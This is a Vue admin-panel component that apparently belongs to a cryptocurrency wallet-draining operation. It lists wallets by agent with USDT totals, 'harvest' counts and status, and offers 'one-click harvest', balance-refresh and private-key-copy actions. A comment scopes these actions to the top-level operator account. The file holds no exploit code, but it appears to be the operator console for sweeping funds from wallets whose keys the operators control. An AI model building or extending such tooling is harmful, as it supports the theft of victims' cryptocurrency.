<template>
  <div class="InstallationList">
    <div>
      <el-input v-model="searchInfo" placeholder="Please input" />
      <el-button type="primary" @click="search">搜索</el-button>
      <div class="details">
        <div>总信息条数：{{Pagination.total}}</div>
        <div>总金额：{{ totalRevenue }}</div>
        <!-- <div>总利润：232323</div> -->
      </div>
    </div>
    <div>
      <h2>筛选：</h2>
      <div class="condition">
        <div>
          <div>
            <p>创建时间：</p>
            <el-date-picker
              v-model="creationTime"
              type="datetimerange"
              range-separator="To"
              start-placeholder="Start date"
              end-placeholder="End date"
            />
          </div>
        </div>
      </div>
      <div>
        <el-button type="primary" @click="Inquire">查询</el-button>
      </div>
    </div>
    <div class="list">
      <div class="header">
        <span>序号</span>
        <span>时间</span>
        <span>ID</span>
        <span>代理</span>
        <span>钱包</span>
        <!-- <span>地址</span> -->
        <span>总金额(USDT)</span>
        <span>收割次数</span>
        <span>收割状态</span>
        <!-- ★ 代理商(1234) 无 shougei/copy_private/wallet_balance_list/update_wallet_balance 权限
             （总调度1 ⌛2026-10-03 最小权限集裁决）。按钮若保留 ⇒ 点了必得「权限不足」＝ G-03 的死链形态，
             故按 v-auth 仅对总后台(888) 渲染；表头同步隐藏以保持列对齐。 -->
        <span v-auth="888">操作</span>
      </div>
      <div class="content" v-for="(item,index) in PrivateDomainlist">
        <div>
          <span>1</span>
          <span>{{ item.create_time }}</span>
          <span>{{ item.id }}</span>
          <span>{{ item.agent_name }}</span>
          <span>{{ item.wallet_name }}</span>
          <!-- <span>2323123....242dssf <el-icon><Connection /></el-icon></span> -->
          <span>{{ item.ustd_num }}</span>
          <span>{{ item.sk_count }}</span>
          <span>
            <span v-if="item.progress == 1">进行中</span>
            <span v-if="item.progress == 0">空闲</span>
          </span>
          <div v-auth="888">
           <span @click="harvest(item.id)">一键收割</span> |
            <span @click="viewAmount(index,item.id)">查看</span> | <span @click="Updatebalance(item.id)">更新余额</span>
          </div>
        </div>
        <div class="amount" v-if="open && SerialNumber == index">
          <div>
            <div v-for="( item, index ) in BalanceList" :key="index">
              <span>{{ item.coin_name }}</span>
              <span>{{ item.balance }}</span>
            </div>
          </div>
        </div>
      </div>
    </div>
    <div class="paging">
      <el-pagination
        small
        background
        layout="prev, pager, next"
        :total="Pagination.total"
        :current-page="Pagination.page"
        :page-size="Pagination.pageSize"
        class="mt-4"
        @current-change="handleCurrentChange"
        @size-change="handleSizeChange"
      />
    </div>
  </div>
</template>

<script setup>
import { onMounted, ref, reactive } from 'vue'
import { agentlist, agent_wallet_list, copyPrivate, walletBalanceList, shougei, restore, update_wallet_balance } from '@/api/index'
import { ElMessage } from 'element-plus'
const searchInfo = ref('')
const open = ref(false)
const SerialNumber = ref(-1)
onMounted(() => {
  wallet_list()
})
const viewAmount = (index, id) => {
  BalanceList.value = []
  GetBalance(id)
  // eslint-disable-next-line eqeqeq
  if (index == SerialNumber.value) {
    open.value = false
    SerialNumber.value = -1
  } else {
    open.value = true
    SerialNumber.value = index
  }
}
const agents = ref('')
const agentslist = ref([])
const deviceslist = ref([])
const Pagination = reactive({
  page: 1,
  pageSize: 10,
  total: 0
})
const creationTime = ref('')
const PrivateDomainlist = ref([])
const totalRevenue = ref(0)
const wallet_list = async() => {
  try {
    const res = await agent_wallet_list({
      page: Pagination.page,
      pageSize: Pagination.pageSize,
      keyword: searchInfo.value,
      agent_id: agents.value || -1,
      start_time: creationTime.value[0],
      end_time: creationTime.value[1],
    })
    PrivateDomainlist.value = res.data.list
    Pagination.total = res.data.total
    totalRevenue.value = res.data.totalRevenue
  } catch (e) {
    PrivateDomainlist.value = []
    Pagination.total = 0
    totalRevenue.value = 0
    ElMessage.error((e && e.message) || '钱包列表加载失败')
  }
}
const handleSizeChange = (val) => {
  Pagination.page = Number(val)
  wallet_list()
}
const handleCurrentChange = (val) => {
  Pagination.page = Number(val)
  wallet_list()
}
const privatekey = ref('')
const search = () => {
  wallet_list()
  searchInfo.value = ''
}
const Inquire = () => {
  wallet_list()
}
const BalanceList = ref([])
const GetBalance = async(id) => {
  try {
    const res = await walletBalanceList({
      wallet_id: id
    })
    BalanceList.value = res.data
  } catch (e) {
    BalanceList.value = []
    ElMessage.error((e && e.message) || '余额查询失败')
  }
}
const harvest = async(id) => {
  try {
    const res = await shougei({
      wallet_id: id
    })
    if (res.code === 0) {
      ElMessage.success('收割成功')
    } else {
      ElMessage.error(res.msg)
    }
  } catch (e) {
    ElMessage.error((e && e.message) || '收割失败')
  }
}
const Updatebalance = async(id) => {
  try {
    const res = await update_wallet_balance({
      wallet_id: id
    })
    if (res.code === 0) {
      ElMessage.success('更新余额成功')
      wallet_list()
    } else {
      ElMessage.error(res.msg)
    }
  } catch (e) {
    ElMessage.error((e && e.message) || '更新余额失败')
  }
}

</script>

<style lang="scss" scoped>
.InstallationList {
  padding: 2.604vw;
  > div:nth-child(1) {
    display: flex;
    align-items: flex-end;
    margin-bottom: 1.563vw;
    :deep(.el-input) {
      width: 26.042vw;
      margin-right: 0.521vw;
    }
    .details {
      display: flex;
      margin-left: 5.208vw;
      > div {
        margin-right: 1.563vw;
        font-size: 0.833vw;
      }
    }
  }
  > div:nth-child(2) {
    display: flex;
    align-items: flex-start;
    // height: 80px;
    margin-bottom: 1.563vw;
    > h2 {
      font-size: 1.302vw;
      margin: 0;
      margin-right: 3.125vw;
    }
    .condition {
      height: 100%;
      display: flex;
      flex-direction: column;
      justify-content: space-between;
      :deep(.el-input) {
        width: 12.5vw;
      }
      > div:nth-child(1) {
        display: flex;
        align-items: center;
        > div {
          display: flex;
          align-items: center;
          margin-right: 2.604vw;
          p {
            width: 4.167vw;
          }
        }
      }
    }
    > div:nth-child(3) {
      height: 100%;
      display: flex;
      flex-direction: column;
      justify-content: flex-end;
    }
  }
  .list {
    border: 1px solid #ccc;
    padding: 0.781vw 1.563vw;
    border-radius: 0.521vw;
    .header {
      display: flex;
      align-items: center;
      margin-bottom: 1.042vw;
      color: #000;
      font-size: 0.833vw;
      font-weight: 700;
      span {
        display: inline-block;
        text-align: center;
      }
      > span:nth-child(1) {
        width: 10%;
      }
      > span:nth-child(2) {
        width: 10%;
      }
      > span:nth-child(3) {
        width: 10%;
      }
      > span:nth-child(4) {
        width: 10%;
      }
      > span:nth-child(5) {
        width: 10%;
      }
      // > span:nth-child(6) {
      //   width: 10%;
      // }
      > span:nth-child(6) {
        width: 10%;
      }
      > span:nth-child(7) {
        width: 10%;
      }
      > span:nth-child(8) {
        width: 10%;
      }
      > span:nth-child(9) {
        width: 19%;
      }
      > span:nth-child(10) {
        width: 10%;
      }
    }
    .content:last-child {
      border-bottom: 0;
    }
    .content {
      > div:nth-child(1) {
        display: flex;
        align-items: center;
        padding: 0.521vw 0;
        border-bottom: 1px solid #ccc;
        color: rgb(65, 64, 64);
        span {
          display: inline-block;
          text-align: center;
        }
        > span:nth-child(1) {
          width: 10%;
        }
        > span:nth-child(2) {
          width: 10%;
        }
        > span:nth-child(3) {
          width: 10%;
        }
        > span:nth-child(4) {
          width: 10%;
        }
        > span:nth-child(5) {
          width: 10%;
        }
        // > span:nth-child(6) {
        //   width: 10%;
        // }
        > span:nth-child(6) {
          width: 10%;
        }
        > span:nth-child(7) {
          width: 10%;
        }
        > span:nth-child(8) {
          width: 10%;
        }
        > div:nth-child(9) {
          width: 19%;
          color: #4d5bf5;
          text-align: center;
          > span:nth-child(1) {
            cursor: pointer;
            font-weight: 700;
          }
          > span:nth-child(2) {
            cursor: pointer;
            font-weight: 700;
          }
          > span:nth-child(3) {
            cursor: pointer;
            font-weight: 700;
          }
          > span:nth-child(4) {
            cursor: pointer;
            font-weight: 700;
          }
        }
        > div:nth-child(10) {
          width: 10%;
          cursor: pointer;
          p {
            width: 60%;
            height: 1.563vw;
            text-align: center;
            line-height: 1.563vw;
            border-radius: 0.313vw;
            background-color: #1890ff;
            color: #fff;
            font-weight: 700;
            margin: 0 auto;
          }
        }
      }
      .amount{
        padding: 0 80px;
        >div{
          display: flex;
          align-items:center;
          border-bottom: 1px solid #000;
          h4{
            margin-right: 2.083vw;
            color: #605bd7;
          }
          >span{
            display: inline-block;
            margin-right: 1.042vw;
          }
          >div{
            padding: 10px 0;
            margin-right: 20px;
            >span:nth-child(1){
              font-size: 16px;
              margin-right: 5px;
              color:#605bd7;
            }
          }
        }
      }
    }
  }
  .paging {
    display: flex;
    justify-content: center;
    align-items: center;
    position: relative;
  }
}
</style>
